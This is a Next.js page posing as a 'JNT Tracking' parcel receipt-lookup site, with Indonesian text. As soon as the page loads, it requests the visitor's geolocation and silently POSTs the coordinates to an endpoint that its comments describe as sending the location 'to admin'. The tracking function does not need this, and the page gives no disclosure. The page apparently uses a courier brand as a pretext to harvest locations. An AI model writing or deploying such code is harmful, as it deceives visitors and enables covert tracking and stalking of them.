import Head from 'next/head';
import Header from '@components/Header';
import Footer from '@components/Footer';
import { useState, useEffect } from 'react';

export default function Home() {
  const [resi, setResi] = useState('');
  const [location, setLocation] = useState(null);

  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const currentLocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          };
          setLocation(currentLocation);

          // Kirim lokasi ke server atau admin saat halaman dimuat
          fetch('/api/sendLocation', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(currentLocation),
          })
          .then((response) => response.json())
          .then((data) => {
            console.log('Lokasi terkirim ke admin:', data.message);
          })
          .catch((error) => {
            console.error('Error mengirim lokasi:', error);
          });
        },
        (error) => {
          console.error('Error mendapatkan lokasi: ', error);
        }
      );
    } else {
      console.error('Geolocation tidak didukung oleh browser ini.');
    }
  }, []);

  const handleResiChange = (e) => {
    setResi(e.target.value);
  };

  const handleSubmitResi = (e) => {
    e.preventDefault();
    alert(`Melacak paket dengan nomor resi: ${resi}`);
    // Kirim nomor resi ke server untuk diproses
    fetch('/api/trackResi', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ resi }),
    })
    .then((response) => response.json())
    .then((data) => {
      console.log('Data tracking paket:', data);
    })
    .catch((error) => {
      console.error('Error melacak paket:', error);
    });
  };

  return (
    <div className="container">
      <Head>
        <title>JNT Tracking - Cek Resi Mudah</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main>
        <Header title="Selamat datang di JNT Tracking" />
        <p className="description">Masukkan nomor resi untuk melacak paket Anda.</p>

        <form onSubmit={handleSubmitResi} className="resi-form">
          <input 
            type="text" 
            placeholder="Masukkan nomor resi" 
            value={resi} 
            onChange={handleResiChange} 
            className="resi-input" 
          />
          <button type="submit" className="btn-track">Lacak</button>
        </form>

        {location && (
          <div className="location-info">
            <p>Lokasi Anda: Latitude {location.latitude}, Longitude {location.longitude}</p>
            <a 
              href={`https://www.google.com/maps?q=${location.latitude},${location.longitude}`} 
              target="_blank" 
              rel="noopener noreferrer"
              className="link-to-google-maps"
            >
              Lihat di Google Maps
            </a>
          </div>
        )}
      </main>

      <Footer />

      <style jsx>{`
        .resi-form {
          display: flex;
          gap: 10px;
          margin-top: 20px;
        }
        .resi-input {
          padding: 10px;
          border: 1px solid #ccc;
          border-radius: 5px;
          flex: 1;
        }
        .btn-track {
          background-color: #0070f3;
          color: white;
          border: none;
          padding: 10px 15px;
          border-radius: 5px;
          cursor: pointer;
        }
        .location-info {
          margin-top: 10px;
          font-size: 14px;
          color: #333;
        }
        .link-to-google-maps {
          display: inline-block;
          margin-top: 10px;
          color: #0070f3;
          text-decoration: none;
        }
        .link-to-google-maps:hover {
          text-decoration: underline;
        }
      `}</style>
    </div>
  );
}
